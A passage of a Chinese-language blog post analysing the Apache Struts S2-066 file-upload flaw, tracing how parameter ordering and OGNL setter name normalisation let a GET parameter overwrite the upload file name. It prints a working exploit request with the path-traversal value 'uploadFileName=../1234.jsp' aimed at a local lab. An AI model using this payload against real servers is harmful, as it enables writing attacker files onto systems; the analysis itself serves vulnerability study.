class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">setParameters</span><span class="params">(Object action, ValueStack stack, HttpParameters parameters)</span> &#123;</span><br><span class="line">    HttpParameters params;</span><br><span class="line">    Map&lt;String, Parameter&gt; acceptableParameters;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.ordered) &#123;</span><br><span class="line">        params = HttpParameters.create().withComparator(<span class="built_in">this</span>.getOrderedComparator()).withParent(parameters).build();</span><br><span class="line">        acceptableParameters = <span class="keyword">new</span> <span class="title class_">TreeMap</span>(<span class="built_in">this</span>.getOrderedComparator());</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        params = HttpParameters.create().withParent(parameters).build();</span><br><span class="line">        acceptableParameters = <span class="keyword">new</span> <span class="title class_">TreeMap</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(Map.Entry&lt;String, Parameter&gt; entry : params.entrySet()) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">parameterName</span> <span class="operator">=</span> (String)entry.getKey();</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">isAcceptableParameter</span> <span class="operator">=</span> <span class="built_in">this</span>.isAcceptableParameter(parameterName, action);</span><br><span class="line">        isAcceptableParameter &amp;= <span class="built_in">this</span>.isAcceptableParameterValue((Parameter)entry.getValue(), action);</span><br><span class="line">        <span class="keyword">if</span> (isAcceptableParameter) &#123;</span><br><span class="line">            acceptableParameters.put(parameterName, entry.getValue());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">ValueStack</span> <span class="variable">newStack</span> <span class="operator">=</span> <span class="built_in">this</span>.valueStackFactory.createValueStack(stack);</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">clearableStack</span> <span class="operator">=</span> newStack <span class="keyword">instanceof</span> ClearableValueStack;</span><br><span class="line">    <span class="keyword">if</span> (clearableStack) &#123;</span><br><span class="line">        ((ClearableValueStack)newStack).clearContextValues();</span><br><span class="line">        Map&lt;String, Object&gt; context = newStack.getContext();</span><br><span class="line">        ReflectionContextState.setCreatingNullObjects(context, <span class="literal">true</span>);</span><br><span class="line">        ReflectionContextState.setDenyMethodExecution(context, <span class="literal">true</span>);</span><br><span class="line">        ReflectionContextState.setReportingConversionErrors(context, <span class="literal">true</span>);</span><br><span class="line">        newStack.getActionContext().withLocale(stack.getActionContext().getLocale()).withValueStack(stack);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">boolean</span> <span class="variable">memberAccessStack</span> <span class="operator">=</span> newStack <span class="keyword">instanceof</span> MemberAccessValueStack;</span><br><span class="line">    <span class="keyword">if</span> (memberAccessStack) &#123;</span><br><span class="line">        <span class="type">MemberAccessValueStack</span> <span class="variable">accessValueStack</span> <span class="operator">=</span> (MemberAccessValueStack)newStack;</span><br><span class="line">        accessValueStack.useAcceptProperties(<span class="built_in">this</span>.acceptedPatterns.getAcceptedPatterns());</span><br><span class="line">        accessValueStack.useExcludeProperties(<span class="built_in">this</span>.excludedPatterns.getExcludedPatterns());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(Map.Entry&lt;String, Parameter&gt; entry : acceptableParameters.entrySet()) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> (String)entry.getKey();</span><br><span class="line">        <span class="type">Parameter</span> <span class="variable">value</span> <span class="operator">=</span> (Parameter)entry.getValue();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            newStack.setParameter(name, value.getObject());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RuntimeException e) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.devMode) &#123;</span><br><span class="line">                <span class="built_in">this</span>.notifyDeveloperParameterException(action, name, e.getMessage());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (clearableStack) &#123;</span><br><span class="line">        stack.getActionContext().withConversionErrors(newStack.getActionContext().getConversionErrors());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">this</span>.addParametersToContext(ActionContext.getContext(), acceptableParameters);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里<code>acceptableParameters</code>是<code>TreeMap</code>的对象，默认根据key的自然顺序升序排序。这里key是String类型，则按照key值的字符逐个去进行比较判断的，并按照从小到大升序排序</p>
+<p><a target="_blank" rel="noopener" href="https://liaoxuefeng.com/books/java/collection/tree-map/index.html">https://liaoxuefeng.com/books/java/collection/tree-map/index.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://codegym.cc/groups/posts/java-string-compareto-method">https://codegym.cc/groups/posts/java-string-compareto-method</a></p>
+<p>于是最终放入<code>acceptableParameters</code>的参数键值对是有序的，而大小写会影响顺序，小写字符排序更后面。那么在调用<code>com.opensymphony.xwork2.ognl.OgnlValueStack#setParameter</code>设置<code>UploadAction</code>的参数时，由于最终调用到 java bean 的 setter 方法，如果出现相同参数名首字母大小写都存在的情况，那么在设置参数值时都会调用到相同的 setter 方法。为什么呢，这里简单跟一下代码</p>
+<p>根据刚刚给在<code>cn.ph0ebus.s2066.action.UploadAction#setUploadFileName</code>下断点时的堆栈信息中，可以分析出调用 java bean 的 setter 方法设置参数值的逻辑，可以给<code>ognl.OgnlRuntime#getSetMethod</code>下断点。</p>
+<p>至于调用相同setter方法的具体逻辑在<code>ognl.OgnlRuntime#capitalizeBeanPropertyName</code>这里，规范化<code>propertyName</code>，也是根据java bean的getter和setter方法规范来的。很容易理解。例如当<code>propertyName</code>为abc和Abc，返回值均为Abc，最后获取到setAbc方法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">capitalizeBeanPropertyName:2609, OgnlRuntime (ognl)</span><br><span class="line">getDeclaredMethods:2651, OgnlRuntime (ognl)</span><br><span class="line">_getSetMethod:2915, OgnlRuntime (ognl)</span><br><span class="line">getSetMethod:2884, OgnlRuntime (ognl)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> String <span class="title function_">capitalizeBeanPropertyName</span><span class="params">(String propertyName)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (propertyName.length() == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> propertyName.toUpperCase();</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (propertyName.startsWith(<span class="string">&quot;get&quot;</span>) &amp;&amp; propertyName.endsWith(<span class="string">&quot;()&quot;</span>) &amp;&amp; Character.isUpperCase(propertyName.substring(<span class="number">3</span>, <span class="number">4</span>).charAt(<span class="number">0</span>))) &#123;</span><br><span class="line">        <span class="keyword">return</span> propertyName;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (propertyName.startsWith(<span class="string">&quot;set&quot;</span>) &amp;&amp; propertyName.endsWith(<span class="string">&quot;)&quot;</span>) &amp;&amp; Character.isUpperCase(propertyName.substring(<span class="number">3</span>, <span class="number">4</span>).charAt(<span class="number">0</span>))) &#123;</span><br><span class="line">        <span class="keyword">return</span> propertyName;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (propertyName.startsWith(<span class="string">&quot;is&quot;</span>) &amp;&amp; propertyName.endsWith(<span class="string">&quot;()&quot;</span>) &amp;&amp; Character.isUpperCase(propertyName.substring(<span class="number">2</span>, <span class="number">3</span>).charAt(<span class="number">0</span>))) &#123;</span><br><span class="line">        <span class="keyword">return</span> propertyName;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">char</span> <span class="variable">first</span> <span class="operator">=</span> propertyName.charAt(<span class="number">0</span>);</span><br><span class="line">        <span class="type">char</span> <span class="variable">second</span> <span class="operator">=</span> propertyName.charAt(<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> (Character.isLowerCase(first) &amp;&amp; Character.isUpperCase(second)) &#123;</span><br><span class="line">            <span class="keyword">return</span> propertyName;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">char</span>[] chars = propertyName.toCharArray();</span><br><span class="line">            chars[<span class="number">0</span>] = Character.toUpperCase(chars[<span class="number">0</span>]);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>(chars);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>而这个时候<code>acceptableParameters</code>的键是<code>[File Name]</code>、<code>[File Name]ContentType</code>、<code>[File Name]FileName</code>。这里环境的file name为upload，根据前面的理论，如果此时上传数据包的<code>name</code>为Upload，那么也可以获取到相同的setter方法并调用赋值</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/s2vuls/s2066.action</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:8080</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>188</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36</span><br><span class="line"></span><br><span class="line"><span class="language-pgsql"><span class="comment">--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;Upload&quot;; filename=&quot;1.txt&quot;</span></span><br><span class="line"><span class="language-pgsql">Content-<span class="keyword">Type</span>: <span class="type">text</span>/plain</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">hello ph0ebus</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN--</span></span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2024/12/17/uX3WBJFt5HGZajA.png" alt="img"></p>
+<p>那么此时如果<code>acceptableParameters</code>存在key为<code>uploadFileName</code>、值可控的元素，由于小写字母<code>u</code>比大写字母<code>U</code>排序更靠后，就可以再次调用<code>setUploadFileName</code>覆盖这里的值。<code>acceptableParameters</code>来源于<code>HttpParameters</code>，于是可以控制<code>HttpParameters</code>来控制<code>acceptableParameters</code>，而这就是HTTP数据包的参数</p>
+<p>于是就可以构造数据包</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/s2vuls/s2066.action?uploadFileName=../1234.jsp</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:8080</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>188</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36</span><br><span class="line"></span><br><span class="line"><span class="language-pgsql"><span class="comment">--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;Upload&quot;; filename=&quot;1.txt&quot;</span></span><br><span class="line"><span class="language-pgsql">Content-<span class="keyword">Type</span>: <span class="type">text</span>/plain</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql"><span class="number">1</span>aaa</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN--</span></span></span><br></pre></td></tr></table></figure>
+
+<p>GET传参，向<code>HttpParameters</code>增加了key为uploadFileName的元素，值也就是传入的参数值，可控</p>
+<p><img src="https://s2.loli.net/2024/12/17/jYXFnKmzGcTWOEl.png" alt="img"></p>
+<p>于是顺利进入到<code>com.opensymphony.xwork2.ognl.OgnlValueStack#setParameter</code>寻找uploadFileName这个对应setter方法进行调用</p>
+<p><img src="https://s2.loli.net/2024/12/17/a8i56znCEgWFYV1.png" alt="img"></p>
+<p>对uploadFileName规范化为UploadFileName</p>
+<p><img src="https://s2.loli.net/2024/12/17/daHiLrO54QDuocs.png" alt="img"></p>
+<p>成功拿到<code>setUploadFileName</code>方法</p>
+<p><img src="https://s2.loli.net/2024/12/17/7Fx2ic5uPXdzJVr.png" alt="img"></p>
+<p>调用<code>setUploadFileName</code>方法覆盖上传的文件名</p>
+<p><img src="https://s2.loli.net/2024/12/17/oNiZxS74V5Hd8IO.png" alt="img"></p>
+<h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>最近爆出来的s2-067看通告说和S2-066相似，于是先分析一下这个，还蛮有意思的，估计S2-067是基于这个的绕过吧</p>
+
+	  <div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+
+	</div>
+
+	
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a type="button" class="btn btn-default disabled"><i class="fa fa-arrow-circle-o-left"></i>Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2024/12/12/fastjson1.2.80 in Springtboot新链学习/" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+		<section id="comments" class="comments">
+			<style>
+			.comments{margin:30px;padding:10px;background:rgb(0, 0, 0)}
+			@media screen and (max-width:800px){.comments{margin:auto;padding:10px;background:#000}}
+			</style>
+			<div id="vcomment" class="comment"></div>
+<script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+<script src="https://cdnjs.loli.net/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+<script>
+var valineConfig = {"enable":true,"appId":"Cbgk0YxBpLhiX5GAO3blh1dL-gzGzoHsz","appKey":"sXGSZcQ400OknswrtdEDSiTp","placeholder":"Comment with Email address will get notification when replied","visitor":false,"avatar":"monsterid","requiredFields":["nick","mail"],"pageView":false}
+valineConfig.el='#vcomment';
+new Valine(valineConfig);
+    // new Valine({
+    //     el: '#vcomment',
+    //     appId: "",
+    //     appKey: "",
+    //     placeholder: "Comment with Email address will get notification when replied",
+    //     avatar:"monsterid",
+    //     visitor: "false",
+    //     requiredFields: "nick,mail".split(','),
+    // });
+</script>
+
+		</section>
+	
+	
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2024-12-15 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/cve/">cve<span>2</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
+    <ul id="tags" class="tag_box list-unstyled collapse in">	  
+	    
+  <li><a href="/tags/security/">security<span>3</span></a></li> <li><a href="/tags/struts/">struts<span>1</span></a></li>
+    </ul>
+	</div>
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
+	   <div id="toc" class="toc collapse in">
+		   <span class="toc-title">Contents</span>
+			<ol class="toc-article"><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B"><span class="toc-article-text">漏洞简介</span></a></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="toc-article-text">影响版本</span></a></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-article-text">环境搭建</span></a></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-article-text">漏洞复现</span></a></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-article-text">漏洞分析</span></a></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#%E7%BB%93%E8%AF%AD"><span class="toc-article-text">结语</span></a></li></ol>
+		</div>
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2024 ph0ebus's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
